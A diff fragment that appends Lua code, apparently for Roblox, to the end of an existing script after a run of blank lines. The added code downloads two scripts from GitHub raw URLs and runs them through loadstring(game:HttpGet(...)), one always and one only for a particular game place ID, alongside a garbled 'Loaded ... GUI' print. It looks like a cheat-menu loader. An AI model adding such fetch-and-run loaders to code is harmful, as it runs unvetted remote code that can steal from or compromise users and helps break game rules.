@@ -80,3 +80,15 @@ end
 end
 end
 end
+
+
+
+
+local place = game.PlaceId
+spawn(function()
+local UILibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/twink"))()
+end)
+if place == 301549746 then
+print("Loaded (*N23im29ieg)_#*gi2ne9uin2geok GUI")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EncryptedHubX/etware/main/etware.xyz/lua/c%2B%2B/idk/penis"))()
+end
